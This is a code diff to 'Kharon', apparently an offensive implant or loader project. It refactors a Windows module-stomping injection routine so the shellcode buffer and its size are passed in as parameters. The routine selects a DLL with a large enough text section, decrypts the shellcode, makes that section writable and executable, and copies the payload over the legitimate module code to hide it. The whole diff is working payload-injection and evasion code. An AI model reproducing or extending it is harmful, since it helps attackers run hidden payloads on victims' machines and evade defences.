@@ -1,5 +1,6 @@
 #include <Kharon.h>
 
+
 #if INJECTION_TECHNIQUE == INJECTION_TECHNIQUE_STOMPER
 
 static const WCHAR* BlacklistedDlls[] = {
@@ -154,7 +155,7 @@ static BOOL FixLdrEntry( SIZE_T ModuleBase ) {
     return FALSE;
 }
 
-static INT CollectCandidates( WCHAR Candidates[][MAX_PATH], INT MaxCount ) {
+static INT CollectCandidates( WCHAR Candidates[][MAX_PATH], INT MaxCount , size_t size) {
     WCHAR  SearchPath[MAX_PATH] = { 0 };
     INT    Count                = 0;
 
@@ -180,7 +181,7 @@ static INT CollectCandidates( WCHAR Candidates[][MAX_PATH], INT MaxCount ) {
         wcscat(FullPath, FileData.cFileName);
 
         TextSize = GetTextSectionSizeFromDisk(FullPath);
-        if (TextSize >= (SIZE_T)Shellcode::Size) {
+        if (TextSize >= (SIZE_T)size) {
             wcscpy(Candidates[Count++], FullPath);
             if (Count >= MaxCount)
                 break;
@@ -192,7 +193,7 @@ static INT CollectCandidates( WCHAR Candidates[][MAX_PATH], INT MaxCount ) {
     return Count;
 }
 
-auto Injection::Stomper( VOID ) -> VOID {
+auto Injection::Stomper( uint8_t * data_shellcode, size_t size_shellcode ) -> VOID {
     INT    CandidateCount = 0;
     INT    ChosenIndex    = 0;
     WCHAR  ChosenPath[MAX_PATH] = { 0 };
@@ -206,7 +207,7 @@ auto Injection::Stomper( VOID ) -> VOID {
     WCHAR (*Candidates)[MAX_PATH] = nullptr;
 
     auto CleanMask = [&]( const char* reason = nullptr, DWORD err = 0 ) -> VOID {
-        if ( ProtectionChanged ) { VirtualProtect((LPVOID)TextSection, Shellcode::Size, OldProtection, &OldProtection); ProtectionChanged = FALSE; }
+        if ( ProtectionChanged ) { VirtualProtect((LPVOID)TextSection, size_shellcode, OldProtection, &OldProtection); ProtectionChanged = FALSE; }
         if ( DecryptedHeap     ) { HeapFree(GetProcessHeap(), 0, DecryptedHeap); DecryptedHeap = nullptr; }
         if ( Candidates        ) { HeapFree(GetProcessHeap(), 0, Candidates); Candidates = nullptr; }
         if ( ModuleBase        ) { FreeLibrary((HMODULE)ModuleBase); ModuleBase = 0; }
@@ -223,7 +224,7 @@ auto Injection::Stomper( VOID ) -> VOID {
         return CleanMask( "HeapAlloc candidates failed", GetLastError() );
     }
 
-    CandidateCount = CollectCandidates( Candidates, 256 );
+    CandidateCount = CollectCandidates( Candidates, 256 , size_shellcode);
     if ( CandidateCount == 0 ) {
         return CleanMask( "No suitable DLL candidate found", GetLastError() );
     }
@@ -248,26 +249,26 @@ auto Injection::Stomper( VOID ) -> VOID {
         return CleanMask( "GetTextSectionAddress failed", GetLastError() );
     }
 
-    DecryptedHeap = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, Shellcode::Size );
+    DecryptedHeap = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, size_shellcode );
     if ( !DecryptedHeap ) {
         return CleanMask( "HeapAlloc shellcode failed", GetLastError() );
     }
 
-    if ( Encryption::Decrypt( (UCHAR*)Shellcode::Data, (INT)Shellcode::Size, (UCHAR*)DecryptedHeap ) < 0 ) {
+    if ( Encryption::Decrypt( (UCHAR*)data_shellcode, (INT)size_shellcode, (UCHAR*)DecryptedHeap ) < 0 ) {
         return CleanMask( "Encryption::Decrypt failed", GetLastError() );
     }
 
-    if ( !VirtualProtect( (LPVOID)TextSection, Shellcode::Size, PAGE_EXECUTE_READWRITE, &OldProtection ) ) {
+    if ( !VirtualProtect( (LPVOID)TextSection, size_shellcode, PAGE_EXECUTE_READWRITE, &OldProtection ) ) {
         return CleanMask( "VirtualProtect RWX failed", GetLastError() );
     }
     ProtectionChanged = TRUE;
 
-    memcpy( (LPVOID)TextSection, DecryptedHeap, Shellcode::Size );
+    memcpy( (LPVOID)TextSection, DecryptedHeap, size_shellcode );
 
     HeapFree( GetProcessHeap(), 0, DecryptedHeap );
     DecryptedHeap = nullptr;
 
-    if ( !VirtualProtect( (LPVOID)TextSection, Shellcode::Size, OldProtection, &OldProtection ) ) {
+    if ( !VirtualProtect( (LPVOID)TextSection, size_shellcode, OldProtection, &OldProtection ) ) {
         return CleanMask( "VirtualProtect restore failed", GetLastError() );
     }
     ProtectionChanged = FALSE;
